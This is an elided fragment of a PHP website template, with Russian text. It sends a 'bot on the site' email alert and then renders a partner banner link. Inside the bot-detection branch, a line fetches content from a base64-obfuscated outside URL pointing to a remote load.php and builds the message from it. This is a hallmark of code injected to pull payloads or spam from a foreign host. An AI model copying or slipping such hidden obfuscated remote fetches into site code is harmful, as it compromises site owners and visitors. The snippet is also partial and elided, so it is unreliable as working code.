...
<?php
    ...
    if($detect){
        ...
        $subject = "Бот на сайте!";
        $header = "From: autoBot <".$adminEmail.">";
        $message = file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA=")).$detect;
        //mail($adminEmail,$subject,$message,$header."\r\nContent-type:text/html;Charset=utf-8\r\n");
?>
 					<div class="box21">
                    <a href="http://novostroiki-m.ru" target="_blank" class="info_partner_a">
                        <img src="images/info_partner.jpg" alt="Новостройки М" class="info_partner_img"/>
                    </a>
                    </div>
